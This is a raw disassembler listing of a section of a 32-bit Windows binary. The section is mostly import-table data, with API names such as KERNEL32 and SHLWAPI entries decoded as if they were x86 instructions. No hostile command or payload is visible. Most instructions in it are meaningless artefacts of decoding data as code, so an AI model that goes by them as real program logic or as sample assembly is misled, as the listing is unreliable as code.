  4134c3:	imul   ebp,DWORD PTR [esi+0x74],0x2010057
  4134ca:	push   ebx
  4134cb:	gs je  0x413525
  4134ce:	imul   ebp,DWORD PTR [esi+0x64],0x724f776f
  4134d5:	addr16 inc ebp
  4134d7:	js     0x4134d9
  4134d9:	add    BYTE PTR [edi+0x65724300],ah
  4134df:	popa   
  4134e0:	je     0x413547
  4134e2:	push   eax
  4134e3:	outs   dx,BYTE PTR gs:[esi]
  4134e5:	add    BYTE PTR [esi+0x74654701],cl
  4134eb:	push   esi
  4134ec:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  4134f3:	dec    edi
  4134f4:	jb     0x41355d
  4134f6:	inc    ebp
  4134f7:	js     0x4134f9
  4134f9:	add    ch,cl
  4134fb:	add    BYTE PTR [ebp+0x73],al
  4134fe:	arpl   WORD PTR [ecx+0x70],sp
  413501:	add    BYTE PTR gs:[eax],al
  413504:	mov    bl,0x1
  413506:	push   eax
  413507:	outs   dx,DWORD PTR ds:[esi]
  413508:	ins    BYTE PTR es:[edi],dx
  413509:	jns    0x413572
  41350b:	outs   dx,DWORD PTR ds:[esi]
  41350c:	outs   dx,BYTE PTR ds:[esi]
  41350d:	add    BYTE PTR [ebx+0x65724300],ch
  413513:	popa   
  413514:	je     0x41357b
  413516:	push   edx
  413517:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  41351c:	outs   dx,BYTE PTR ds:[esi]
  41351d:	add    BYTE PTR [ecx+eax*1+0x54746547],al
  413524:	gs js  0x41359b
  413527:	inc    ebp
  413528:	js     0x41359e
  41352a:	outs   dx,BYTE PTR gs:[esi]
  41352c:	je     0x41357e
  41352e:	outs   dx,DWORD PTR ds:[esi]
  41352f:	imul   ebp,DWORD PTR [esi+0x74],0x573233
  413536:	jo     0x413538
  413538:	inc    ecx
  413539:	fs fs inc esi
  41353c:	outs   dx,DWORD PTR ds:[esi]
  41353d:	outs   dx,BYTE PTR ds:[esi]
  41353e:	je     0x413592
  413540:	gs jae 0x4135b2
  413543:	jne    0x4135b7
  413545:	arpl   WORD PTR [ebp+0x57],sp
  413548:	add    BYTE PTR [eax],al
  41354a:	inc    ecx
  41354b:	add    DWORD PTR [edi+0x65],eax
  41354e:	je     0x413594
  413550:	gs jbe 0x4135bc
  413553:	arpl   WORD PTR [ebp+0x43],sp
  413556:	popa   
  413557:	jo     0x4135cc
  413559:	add    BYTE PTR [esi+0x1],ch
  41355c:	inc    edi
  41355d:	gs je  0x4135b0
  413560:	imul   edi,DWORD PTR [eax+0x65],0xd500006c
  413567:	add    BYTE PTR [ebp+0x78],al
  41356a:	je     0x4135c0
  41356c:	gs js  0x4135e3
  41356f:	dec    edi
  413570:	jne    0x4135e6
  413572:	push   edi
  413573:	add    BYTE PTR [esi+0x65724300],ah
  413579:	popa   
  41357a:	je     0x4135e1
  41357c:	push   eax
  41357d:	popa   
  41357e:	je     0x4135f4
  413580:	gs jb  0x4135f1
  413583:	inc    edx
  413584:	jb     0x4135fb
  413586:	jae    0x4135f0
  413588:	add    BYTE PTR [eax],al
  41358a:	into   
  41358b:	add    BYTE PTR [ebp+0x78],al
  41358e:	arpl   WORD PTR [ebp+esi*2+0x64],bp
  413592:	gs inc ebx
  413594:	ins    BYTE PTR es:[edi],dx
  413595:	imul   esi,DWORD PTR [eax+0x52],0x746365
  41359c:	lds    eax,FWORD PTR [eax]
  41359e:	inc    ebp
  41359f:	outs   dx,BYTE PTR ds:[esi]
  4135a0:	jne    0x41360f
  4135a2:	inc    esi
  4135a3:	outs   dx,DWORD PTR ds:[esi]
  4135a4:	outs   dx,BYTE PTR ds:[esi]
  4135a5:	je     0x4135ed
  4135a7:	popa   
  4135a8:	ins    DWORD PTR es:[edi],dx
  4135a9:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0x47005773
  4135b1:	inc    esp
  4135b2:	dec    ecx
  4135b3:	xor    esi,DWORD PTR [edx]
  4135b5:	cs fs ins BYTE PTR es:[edi],dx
  4135b8:	ins    BYTE PTR es:[edi],dx
  4135b9:	add    BYTE PTR [edi+0x74654701],bl
  4135bf:	inc    ebx
  4135c0:	outs   dx,DWORD PTR ds:[esi]
  4135c1:	ins    DWORD PTR es:[edi],dx
  4135c2:	jo     0x413639
  4135c4:	je     0x41362b
  4135c6:	jb     0x413616
  4135c8:	popa   
  4135c9:	ins    DWORD PTR es:[edi],dx
  4135ca:	gs inc ecx
  4135cc:	add    BYTE PTR [eax],al
  4135ce:	sbb    eax,0x74655304
  4135d3:	dec    eax
  4135d4:	popa   
  4135d5:	outs   dx,BYTE PTR ds:[esi]
  4135d6:	fs ins BYTE PTR es:[edi],dx
  4135d8:	gs inc ebx
  4135da:	outs   dx,DWORD PTR ds:[esi]
  4135db:	jne    0x41364b
  4135dd:	je     0x4135df
  4135df:	add    BYTE PTR [edx],bh
  4135e1:	add    ecx,DWORD PTR [edi+0x70]
  4135e4:	outs   dx,BYTE PTR gs:[esi]
  4135e6:	inc    esi
  4135e7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x4300f200
  4135ef:	jb     0x413656
  4135f1:	popa   
  4135f2:	je     0x413659
  4135f4:	push   edi
  4135f5:	popa   
  4135f6:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  4135fe:	ins    DWORD PTR es:[edi],dx
  4135ff:	gs jb  0x413643
  413602:	add    BYTE PTR [eax],al
  413604:	and    al,0x3
  413606:	dec    ebp
  413607:	popa   
  413608:	jo     0x413660
  41360a:	imul   esp,DWORD PTR [ebp+0x77],0x6946664f
  413611:	ins    BYTE PTR es:[edi],dx
  413612:	add    BYTE PTR gs:[esp+eax*1],bh
  413616:	push   ebx
  413617:	gs je  0x41366e
  41361a:	push   0x64616572
  41361f:	push   eax
  413620:	jb     0x41368b
  413622:	outs   dx,DWORD PTR ds:[esi]
  413623:	jb     0x41368e
  413625:	je     0x4136a0
  413627:	add    BYTE PTR [edx+0x6f6c4702],dl
  41362d:	bound  esp,QWORD PTR [ecx+0x6c]
  413630:	inc    edi
  413631:	gs je  0x413675
  413634:	je     0x4136a5
  413636:	ins    DWORD PTR es:[edi],dx
  413637:	dec    esi
  413638:	popa   
  413639:	ins    DWORD PTR es:[edi],dx
  41363a:	gs push edi
  41363c:	add    BYTE PTR [eax],al
  41363e:	retf   
  41363f:	add    cl,BYTE PTR [ecx+0x73]
  413642:	inc    edx
  413643:	popa   
  413644:	fs push edx
  413646:	gs popa 
  413648:	fs push eax
  41364a:	je     0x4136be
  41364c:	add    BYTE PTR [eax],al
  41364e:	or     BYTE PTR [ecx],al
  413650:	inc    esp
  413651:	gs jbe 0x4136bd
  413654:	arpl   WORD PTR [ebp+0x49],sp
  413657:	outs   dx,DWORD PTR ds:[esi]
  413658:	inc    ebx
  413659:	outs   dx,DWORD PTR ds:[esi]
  41365a:	outs   dx,BYTE PTR ds:[esi]
  41365b:	je     0x4136cf
  41365d:	outs   dx,DWORD PTR ds:[esi]
  41365e:	ins    BYTE PTR es:[edi],dx
  41365f:	add    BYTE PTR [ecx+0x1],bl
  413662:	inc    esi
  413663:	imul   ebp,DWORD PTR [esi+0x64],0x736f6c43
  41366a:	add    BYTE PTR gs:[edx],cl
  41366d:	add    al,BYTE PTR [edi+0x65]
  413670:	je     0x4136bf
  413672:	outs   dx,DWORD PTR ds:[esi]
  413673:	fs jne 0x4136e2
  413676:	gs dec eax
  413678:	popa   
  413679:	outs   dx,BYTE PTR ds:[esi]
  41367a:	fs ins BYTE PTR es:[edi],dx
  41367c:	gs inc ecx
  41367e:	add    BYTE PTR [eax],al
  413680:	inc    edx
  413681:	add    DWORD PTR [esi+0x69],eax
  413684:	outs   dx,BYTE PTR ds:[esi]
  413685:	fs dec esi
  413687:	gs js  0x4136fe
  41368a:	inc    ebx
  41368b:	push   0x65676e61
  413690:	dec    esi
  413691:	outs   dx,DWORD PTR ds:[esi]
  413692:	je     0x4136fd
  413694:	imul   sp,WORD PTR [ebx+0x61],0x6974
  41369a:	outs   dx,DWORD PTR ds:[esi]
  41369b:	outs   dx,BYTE PTR ds:[esi]
  41369c:	add    BYTE PTR [eax],al
  41369e:	xor    eax,0x74655304
  4136a3:	push   esp
  4136a4:	push   0x64616572
  4136a9:	inc    ecx
  4136aa:	data16 imul bp,WORD PTR [esi+0x69],0x7974
  4136b1:	dec    ebp
  4136b2:	popa   
  4136b3:	jae    0x413720
  4136b5:	add    BYTE PTR [esi],bl
  4136b7:	add    al,BYTE PTR [edi+0x65]
  4136ba:	je     0x41370c
  4136bc:	jb     0x413727
  4136be:	outs   dx,DWORD PTR ds:[esi]
  4136bf:	jb     0x41372a
  4136c1:	je     0x41373c
  4136c3:	inc    ebx
  4136c4:	ins    BYTE PTR es:[edi],dx
  4136c5:	popa   
  4136c6:	jae    0x41373b
  4136c8:	add    BYTE PTR [eax],al
  4136ca:	sti    
  4136cb:	add    DWORD PTR [edi+0x65],eax
  4136ce:	je     0x41371c
  4136d0:	popa   
  4136d1:	jae    0x413747
  4136d3:	inc    ebp
  4136d4:	jb     0x413748
  4136d6:	outs   dx,DWORD PTR ds:[esi]
  4136d7:	jb     0x4136d9
  4136d9:	add    BYTE PTR [edi],dl
  4136db:	add    ecx,DWORD PTR [edi+ebp*2+0x63]
  4136df:	imul   eax,DWORD PTR [esi+0x69],0x6c
  4136e3:	add    BYTE PTR gs:[eax],al
  4136e6:	retf   
  4136e7:	add    DWORD PTR [edi+0x65],eax
  4136ea:	je     0x41372f
  4136ec:	jne    0x413760
  4136ee:	jb     0x413755
  4136f0:	outs   dx,BYTE PTR ds:[esi]
  4136f1:	je     0x413737
  4136f3:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4136fa:	jns    0x413753
  4136fc:	add    BYTE PTR [eax],al
  4136fe:	mov    BYTE PTR [eax],al
  413700:	inc    ecx
  413701:	jb     0x413768
  413703:	inc    esi
  413704:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x41736970
  41370c:	dec    esi
  41370d:	push   ebx
  41370e:	dec    ecx
  41370f:	add    BYTE PTR ds:0x74655304,ah
  413715:	dec    ebp
  413716:	popa   
  413717:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x6e49746f
  41371f:	outs   dx,WORD PTR ds:[esi]
  413721:	add    dl,cl
  413723:	add    BYTE PTR [ebx+0x72],al
  413726:	gs popa 
  413728:	je     0x41378f
  41372a:	inc    ebp
  41372b:	jbe    0x413792
  41372d:	outs   dx,BYTE PTR ds:[esi]
  41372e:	je     0x413771
  413730:	add    BYTE PTR [eax],al
  413732:	outs   dx,BYTE PTR ds:[esi]
  413733:	add    DWORD PTR [esi+0x69],eax
  413736:	outs   dx,BYTE PTR ds:[esi]
  413737:	fs push edx
  413739:	gs jae 0x4137ab
  41373c:	jne    0x4137b0
  41373e:	arpl   WORD PTR [ebp+0x45],sp
  413741:	js     0x41379a
  413743:	add    BYTE PTR [eax+0x3],bh
  413746:	push   edx
  413747:	gs popa 
  413749:	fs inc esi
  41374b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x47026100
  413753:	gs je  0x4137aa
  413756:	gs ins DWORD PTR es:[edi],dx
  413758:	jo     0x4137aa
  41375a:	popa   
  41375b:	je     0x4137c5
  41375d:	inc    ecx
  41375e:	add    BYTE PTR [eax],al
  413760:	mov    DWORD PTR [edx],eax
  413762:	inc    edi
  413763:	ins    BYTE PTR es:[edi],dx
  413764:	outs   dx,DWORD PTR ds:[esi]
  413765:	bound  esp,QWORD PTR [ecx+0x6c]
  413768:	inc    ecx
  413769:	ins    BYTE PTR es:[edi],dx
  41376a:	ins    BYTE PTR es:[edi],dx
  41376b:	outs   dx,DWORD PTR ds:[esi]
  41376c:	arpl   WORD PTR [eax],ax
  41376e:	xchg   esp,eax
  41376f:	add    al,0x57
  413771:	imul   ebp,DWORD PTR [esi+0x45],0x636578
  413778:	bound  eax,QWORD PTR [edx]
  41377a:	inc    edi
  41377b:	gs je  0x4137d2
  41377e:	gs ins DWORD PTR es:[edi],dx
  413780:	jo     0x4137d2
  413782:	popa   
  413783:	je     0x4137ed
  413785:	push   edi
  413786:	add    BYTE PTR [eax],al
  413788:	rol    BYTE PTR [eax],1
  41378a:	inc    ebx
  41378b:	jb     0x4137f2
  41378d:	popa   
  41378e:	je     0x4137f5
  413790:	inc    esi
  413791:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x47026700
  413799:	gs je  0x4137f0
  41379c:	push   0x64616572
  4137a1:	dec    esp
  4137a2:	outs   dx,DWORD PTR ds:[esi]
  4137a3:	arpl   WORD PTR [ecx+0x6c],sp
  4137a6:	add    BYTE PTR gs:[eax],ah
  4137a9:	add    DWORD PTR [ebp+0x6e],eax
  4137ac:	jne    0x41381b
  4137ae:	push   edx
  4137af:	gs jae 0x413821
  4137b2:	jne    0x413826
  4137b4:	arpl   WORD PTR [ebp+0x4e],sp
  4137b7:	popa   
  4137b8:	ins    DWORD PTR es:[edi],dx
  4137b9:	gs jae 0x4137fd
  4137bc:	add    BYTE PTR [eax],al
  4137be:	repz add DWORD PTR [edi+0x65],eax
  4137c2:	je     0x41380a
  4137c4:	jne    0x413832
  4137c6:	ins    BYTE PTR es:[edi],dx
  4137c7:	push   eax
  4137c8:	popa   
  4137c9:	je     0x413833
  4137cb:	dec    esi
  4137cc:	popa   
  4137cd:	ins    DWORD PTR es:[edi],dx
  4137ce:	gs push edi
  4137d0:	add    BYTE PTR [eax],al
  4137d2:	push   eax
  4137d3:	add    DWORD PTR [esi+0x69],eax
  4137d6:	ins    BYTE PTR es:[edi],dx
  4137d7:	gs push esp
  4137d9:	imul   ebp,DWORD PTR [ebp+0x65],0x79536f54
  4137e0:	jae    0x413856
  4137e2:	gs ins DWORD PTR es:[edi],dx
  4137e4:	push   esp
  4137e5:	imul   ebp,DWORD PTR [ebp+0x65],0xe60000
  4137ec:	inc    ebx
  4137ed:	jb     0x413854
  4137ef:	popa   
  4137f0:	je     0x413857
  4137f2:	push   edx
  4137f3:	gs ins DWORD PTR es:[edi],dx
  4137f5:	outs   dx,DWORD PTR ds:[esi]
  4137f6:	je     0x41385d
  4137f8:	push   esp
  4137f9:	push   0x64616572
  4137fe:	add    BYTE PTR [eax],al
  413800:	jns    0x413804
  413802:	inc    edi
  413803:	gs je  0x41385c
  413806:	gs jb  0x41387c
  413809:	imul   ebp,DWORD PTR [edi+0x6e],0x1010000
  413810:	inc    esp
  413811:	gs ins BYTE PTR es:[edi],dx
  413813:	gs je  0x41387b
  413816:	inc    ebx
  413817:	jb     0x413882
  413819:	je     0x413884
  41381b:	arpl   WORD PTR [ecx+0x6c],sp
  41381e:	push   ebx
  41381f:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  413824:	outs   dx,BYTE PTR ds:[esi]
  413825:	add    BYTE PTR [ecx],cl
  413827:	add    al,BYTE PTR [edi+0x65]
  41382a:	je     0x413879
  41382c:	outs   dx,DWORD PTR ds:[esi]
  41382d:	fs jne 0x41389c
  413830:	gs inc esi
  413832:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  41383a:	add    BYTE PTR [eax],al
  41383c:	dec    edi
  41383d:	add    al,0x53
  41383f:	jne    0x4138b4
  413841:	jo     0x4138a8
  413843:	outs   dx,BYTE PTR ds:[esi]
  413844:	fs push esp
  413846:	push   0x64616572
  41384b:	add    ah,cl
  41384d:	add    al,0x6c
  41384f:	jae    0x4138c5
  413851:	jb     0x4138b6
  413853:	jo     0x4138ce
  413855:	outs   dx,BYTE PTR ds:[esi]
  413856:	push   edi
  413857:	add    bh,dh
  413859:	add    DWORD PTR [edi+0x65],eax
  41385c:	je     0x4138a6
  41385e:	popa   
  41385f:	outs   dx,BYTE PTR ds:[esi]
  413860:	fs ins BYTE PTR es:[edi],dx
  413862:	gs dec ecx
  413864:	outs   dx,BYTE PTR ds:[esi]
  413865:	outs   dx,WORD PTR ds:[esi]
  413867:	jb     0x4138d6
  413869:	popa   
  41386a:	je     0x4138d5
  41386c:	outs   dx,DWORD PTR ds:[esi]
  41386d:	outs   dx,BYTE PTR ds:[esi]
  41386e:	add    BYTE PTR [eax],al
  413870:	or     eax,DWORD PTR [ebx]
  413872:	dec    esp
  413873:	outs   dx,DWORD PTR ds:[esi]
  413874:	arpl   WORD PTR [ecx+0x6c],sp
  413877:	inc    ecx
  413878:	ins    BYTE PTR es:[edi],dx
  413879:	ins    BYTE PTR es:[edi],dx
  41387a:	outs   dx,DWORD PTR ds:[esi]
  41387b:	arpl   WORD PTR [eax],ax
  41387d:	add    BYTE PTR [ebx+0x2],ah
  413880:	inc    edi
  413881:	gs je  0x4138d8
  413884:	push   0x64616572
  413889:	inc    ebx
  41388a:	outs   dx,DWORD PTR ds:[esi]
  41388b:	outs   dx,BYTE PTR ds:[esi]
  41388c:	je     0x4138f3
  41388e:	js     0x413904
  413890:	add    BYTE PTR [eax],al
  413892:	ret    
  413893:	add    edx,DWORD PTR [edx+0x74]
  413896:	ins    BYTE PTR es:[edi],dx
  413897:	push   ebp
  413898:	outs   dx,BYTE PTR ds:[esi]
  413899:	ja     0x413904
  41389b:	outs   dx,BYTE PTR ds:[esi]
  41389c:	add    BYTE PTR fs:[ecx+eax*1+0x41746547],cl
  4138a4:	je     0x413915
  4138a6:	ins    DWORD PTR es:[edi],dx
  4138a7:	dec    esi
  4138a8:	popa   
  4138a9:	ins    DWORD PTR es:[edi],dx
  4138aa:	gs push edi
  4138ac:	add    BYTE PTR [eax],al
  4138ae:	jmp    0x6946:0x74654701
  4138b5:	ins    BYTE PTR es:[edi],dx
  4138b6:	gs inc ecx
  4138b8:	je     0x41392e
  4138ba:	jb     0x413925
  4138bc:	bound  esi,QWORD PTR [ebp+0x74]
  4138bf:	gs jae 0x413907
  4138c2:	js     0x413905
  4138c4:	add    BYTE PTR [eax],al
  4138c6:	inc    edx
  4138c7:	add    al,BYTE PTR [edi+0x65]
  4138ca:	je     0x41391f
  4138cc:	push   0x5074726f
  4138d1:	popa   
  4138d2:	je     0x41393c
  4138d4:	dec    esi
  4138d5:	popa   
  4138d6:	ins    DWORD PTR es:[edi],dx
  4138d7:	gs inc ecx
  4138d9:	add    bl,bl
  4138db:	add    edx,DWORD PTR [ebx+0x65]
  4138de:	popa   
  4138df:	jb     0x413944
  4138e1:	push   0x68746150
  4138e6:	inc    ecx
  4138e7:	add    BYTE PTR [eax+0x4],al
  4138ea:	push   ebx
  4138eb:	gs je  0x413942
  4138ee:	imul   ebp,DWORD PTR [ebp+0x65],0x65755172
  4138f5:	jne    0x41395c
  4138f7:	push   esp
  4138f8:	imul   ebp,DWORD PTR [ebp+0x65],0xb4000072
  4138ff:	add    edx,DWORD PTR [edx+0x65]
  413902:	ins    DWORD PTR es:[edi],dx
  413903:	outs   dx,DWORD PTR ds:[esi]
  413904:	jbe    0x41396b
  413906:	inc    esp
  413907:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  41390e:	jns    0x413967
  413910:	add    BYTE PTR [eax],al
  413912:	ret    
  413913:	add    al,0x6c
  413915:	jae    0x41398b
  413917:	jb     0x41397c
  413919:	ins    DWORD PTR es:[edi],dx
  41391a:	jo     0x413973
  41391c:	add    BYTE PTR [eax],al
  41391e:	dec    edi
  41391f:	add    DWORD PTR [esi+0x69],eax
  413922:	ins    BYTE PTR es:[edi],dx
  413923:	gs push esp
  413925:	imul   ebp,DWORD PTR [ebp+0x65],0x6f4c6f54
  41392c:	arpl   WORD PTR [ecx+0x6c],sp
  41392f:	inc    esi
  413930:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x656d69
  413938:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413939:	add    BYTE PTR [ebx+0x61],al
  41393c:	outs   dx,BYTE PTR ds:[esi]
  41393d:	arpl   WORD PTR [ebp+0x6c],sp
  413940:	push   edi
  413941:	popa   
  413942:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  41394a:	ins    DWORD PTR es:[edi],dx
  41394b:	gs jb  0x41394e
  41394e:	dec    ebx
  41394f:	inc    ebp
  413950:	push   edx
  413951:	dec    esi
  413952:	inc    ebp
  413953:	dec    esp
  413954:	xor    esi,DWORD PTR [edx]
  413956:	cs fs ins BYTE PTR es:[edi],dx
  413959:	ins    BYTE PTR es:[edi],dx
  41395a:	add    BYTE PTR [eax],al
  41395c:	inc    esi
  41395d:	add    BYTE PTR [eax+0x61],dl
  413960:	je     0x4139ca
  413962:	inc    esi
  413963:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  41396a:	outs   dx,BYTE PTR ds:[esi]
  41396b:	jae    0x4139d6
  41396d:	outs   dx,DWORD PTR ds:[esi]
  41396e:	outs   dx,BYTE PTR ds:[esi]
  41396f:	inc    ecx
  413970:	add    BYTE PTR [eax],al
  413972:	inc    edi
  413973:	add    BYTE PTR [eax+0x61],dl
  413976:	je     0x4139e0
  413978:	inc    esi
  413979:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  413980:	outs   dx,BYTE PTR ds:[esi]
  413981:	jae    0x4139ec
  413983:	outs   dx,DWORD PTR ds:[esi]
  413984:	outs   dx,BYTE PTR ds:[esi]
  413985:	push   edi
  413986:	add    BYTE PTR [eax],al
  413988:	push   ebx
  413989:	dec    eax
  41398a:	dec    esp
  41398b:	push   edi
  41398c:	inc    ecx
  41398d:	push   eax
  41398e:	dec    ecx
  41398f:	cs fs ins BYTE PTR es:[edi],dx
  413992:	ins    BYTE PTR es:[edi],dx
  413993:	add    BYTE PTR [ebx+0x46],dh
  413996:	addr16 popa 
  413998:	pop    ecx
  413999:	dec    ebp
  41399a:	popa   
  41399b:	jns    0x4139f1
  41399d:	push   ecx
  41399e:	imul   ebp,DWORD PTR [ebx+0x74],0x78
  4139a2:	je     0x413a05
  4139a4:	inc    ebx
  4139a5:	push   ecx
  4139a6:	ins    BYTE PTR es:[edi],dx
  4139a7:	pop    eax
  4139a8:	add    BYTE PTR [eax],al
  4139aa:	add    BYTE PTR [eax],al
  4139ac:	or     al,0x3e
  4139ae:	inc    ecx
  4139af:	add    BYTE PTR [esi+edi*1],dl
  4139b2:	inc    ecx
  4139b3:	add    ah,dh
  4139b5:	cmp    eax,DWORD PTR [ecx+0x0]
  4139b8:	call   0x794febc8
  4139bd:	dec    edi
  4139be:	ret    0x774e
  4139c1:	dec    edi
  4139c2:	cmp    eax,0x384f4f4f
  4139c7:	dec    edi
  4139c8:	jp     0x413a19
  4139ca:	cmp    ecx,DWORD PTR [edi+0x5e]
  4139cd:	dec    edi
  4139ce:	ss dec edi
  4139d0:	add    ecx,DWORD PTR [edi+0x31]
  4139d3:	dec    edi
  4139d4:	ret    0x324e
  4139d7:	dec    edi
  4139d8:	push   ds
  4139d9:	push   edx
  4139da:	pop    ds
  4139db:	push   ebx
  4139dc:	cmp    DWORD PTR [edi+0x79],ecx
  4139df:	dec    edi
  4139e0:	ret    0x774e
  4139e3:	dec    edi
  4139e4:	cmp    eax,0x384f4f4f
  4139e9:	dec    edi
  4139ea:	jp     0x413a3b
  4139ec:	cmp    ecx,DWORD PTR [edi+0x5e]
  4139ef:	dec    edi
  4139f0:	ss dec edi
  4139f2:	imul   ecx,DWORD PTR [edi+0x31],0x324ec24f
  4139f9:	dec    edi
  4139fa:	push   ds
  4139fb:	bound  ebx,QWORD PTR [edi]
  4139fd:	arpl   WORD PTR [ecx],di
  4139ff:	dec    edi
  413a00:	jns    0x413a51
  413a02:	ret    0x724e
  413a05:	dec    edi
  413a06:	cmp    eax,0x394f034f
  413a0b:	dec    edi
  413a0c:	dec    esp
  413a0d:	dec    edi
  413a0e:	xor    al,0x4f
  413a10:	ret    0x304e
  413a13:	dec    edi
  413a14:	push   ds
  413a15:	jb     0x413a36
  413a17:	jae    0x413a28
  413a19:	or     DWORD PTR [eax],0xffffff80
  413a1c:	js     0x4139ae
  413a1e:	jns    0x4139b1
  413a20:	aas    
  413a21:	dec    edi
  413a22:	jbe    0x413a73
  413a24:	ret    0x764e
  413a27:	dec    edi
  413a28:	ds dec edi
  413a2a:	dec    esp
  413a2b:	dec    edi
  413a2c:	cmp    DWORD PTR [edi+0x3],ecx
  413a2f:	dec    edi
  413a30:	xor    eax,0x364ec24f
  413a35:	dec    edi
  413a36:	push   ds
  413a37:	sbb    BYTE PTR [edi],0x83
  413a3a:	setae  BYTE PTR [eax]
  413a3d:	nop
  413a3e:	js     0x4139e0
  413a40:	jns    0x4139e3
  413a42:	aas    
  413a43:	dec    edi
  413a44:	jbe    0x413a95
  413a46:	ret    0x764e
  413a49:	dec    edi
  413a4a:	ds dec edi
  413a4c:	dec    esp
  413a4d:	dec    edi
  413a4e:	cmp    DWORD PTR [edi+0x69],ecx
  413a51:	dec    edi
  413a52:	xor    eax,0x364ec24f
  413a57:	dec    edi
  413a58:	push   ds
  413a59:	xchg   edx,eax
  413a5a:	pop    ds
  413a5b:	xchg   ebx,eax
  413a5c:	bt     DWORD PTR [eax],ecx
  413a5f:	mov    al,ds:0xb179b078
  413a64:	aas    
  413a65:	dec    edi
  413a66:	push   0x4e4ec24f
  413a6b:	dec    edi
  413a6c:	cmp    eax,0x394f034f
  413a71:	dec    edi
  413a72:	push   ecx
  413a73:	dec    edi
  413a74:	xor    al,0x4f
  413a76:	ret    0x364e
  413a79:	dec    edi
  413a7a:	push   ds
  413a7b:	mov    ds:0xb30fa31f,al
  413a80:	or     BYTE PTR [eax-0x3e863f88],dh
  413a86:	aas    
  413a87:	dec    edi
  413a88:	push   0x4e4ec24f
  413a8d:	dec    edi
  413a8e:	cmp    eax,0x394f784f
  413a93:	dec    edi
  413a94:	pop    edi
  413a95:	dec    edi
  413a96:	cmp    ecx,DWORD PTR [edi-0x3e]
  413a99:	dec    esi
  413a9a:	xor    eax,0x1fb21e4f
  413a9f:	mov    bl,0xf
  413aa1:	ret    
  413aa2:	or     al,al
  413aa4:	js     0x413a76
  413aa6:	jns    0x413a79
  413aa8:	aas    
  413aa9:	dec    edi
  413aaa:	push   0x4e4ec24f
  413aaf:	dec    edi
  413ab0:	cmp    eax,0x394f724f
  413ab5:	dec    edi
  413ab6:	dec    esi
  413ab7:	dec    edi
  413ab8:	xor    al,0x4f
  413aba:	ret    0x304e
  413abd:	dec    edi
  413abe:	push   ds
  413abf:	ret    0xc31f
  413ac2:	psrlq  mm1,QWORD PTR [eax]
  413ac5:	sar    BYTE PTR [eax-0x20],1
  413ac8:	jns    0x413aab
  413aca:	aas    
  413acb:	dec    edi
  413acc:	push   0x4e4ec24f
  413ad1:	dec    edi
  413ad2:	cmp    eax,0x394f734f
  413ad7:	dec    edi
  413ad8:	dec    esp
  413ad9:	dec    edi
  413ada:	xor    al,0x4f
  413adc:	ret    0x364e
  413adf:	dec    edi
  413ae0:	push   ds
  413ae1:	rcr    BYTE PTR [edi],cl
  413ae3:	ror    DWORD PTR [edi],cl
  413ae5:	jecxz  0x413aef
  413ae7:	loopne 0x413b61
  413ae9:	lock jns 0x413add
  413aec:	aas    
  413aed:	dec    edi
  413aee:	ins    DWORD PTR es:[edi],dx
  413aef:	dec    edi
  413af0:	ret    0x5f4e
  413af3:	dec    edi
  413af4:	cmp    eax,0x3e4f524f
  413af9:	dec    edi
  413afa:	ret    0x3f4e
  413afd:	dec    edi
  413afe:	push   ds
  413aff:	loop   0x413b20
  413b01:	jecxz  0x413b12
  413b03:	repz or al,dh
  413b06:	js     0x413b08
  413b08:	jns    0x413b0b
  413b0a:	js     0x413b1c
  413b0c:	jns    0x413b1f
  413b0e:	ds dec edi
  413b10:	jg     0x413b61
  413b12:	ret    0x5b4e
  413b15:	dec    edi
  413b16:	cmp    al,0x4f
  413b18:	jb     0x413b69
  413b1a:	ds dec edi
  413b1c:	dec    ebp
  413b1d:	dec    edi
  413b1e:	cmp    ecx,DWORD PTR [edi-0x3e]
  413b21:	dec    esi
  413b22:	xor    eax,0x1f021e4f
  413b27:	add    ecx,DWORD PTR [edi]
  413b29:	adc    ecx,DWORD PTR [eax]
  413b2b:	adc    BYTE PTR [eax+0x20],bh
  413b2e:	jns    0x413b51
  413b30:	aas    
  413b31:	dec    edi
  413b32:	add    BYTE PTR [eax],al
  413b34:	mov    esp,0xb0004139
  413b39:	cmp    eax,DWORD PTR [ecx+0x0]
  413b3c:	mov    eax,0x1800413b
  413b41:	ds inc ecx
  413b43:	add    BYTE PTR [ebp+edi*1+0x41],bh
  413b47:	add    BYTE PTR [eax],cl
  413b49:	ds inc ecx
  413b4b:	add    BYTE PTR [eax-0x63ffbec5],bl
  413b51:	cmp    eax,DWORD PTR [ecx+0x0]
  413b54:	add    BYTE PTR [esi],bh
  413b56:	inc    ecx
  413b57:	add    BYTE PTR [eax],al
  413b59:	cmp    al,0x41
  413b5b:	add    BYTE PTR [edx-0x4e076357],cl
  413b61:	mov    edx,0x3bb4f89c
  413b66:	inc    ecx
  413b67:	add    BYTE PTR [eax],bh
  413b69:	cmp    eax,0x3d4c0041
  413b6e:	inc    ecx
  413b6f:	add    BYTE PTR [eax+0x3d],bl
  413b72:	inc    ecx
  413b73:	add    BYTE PTR [eax+0x3d],ch
  413b76:	inc    ecx
  413b77:	add    ah,ch
  413b79:	cmp    eax,DWORD PTR [ecx+0x0]
  413b7c:	mov    eax,0xc004139
  413b81:	cmp    al,0x41
  413b83:	add    ah,bh
  413b85:	cmp    eax,DWORD PTR [ecx+0x0]
  413b88:	sbb    al,0x3e
  413b8a:	inc    ecx
  413b8b:	add    BYTE PTR [ecx],dh
  413b8d:	test   DWORD PTR [eax+edi*8-0x7ee8f462],ebx
  413b94:	sar    BYTE PTR [ebx],0x41
  413b97:	add    BYTE PTR [ebx-0x707ee9e4],dl
  413b9d:	or     eax,0x705
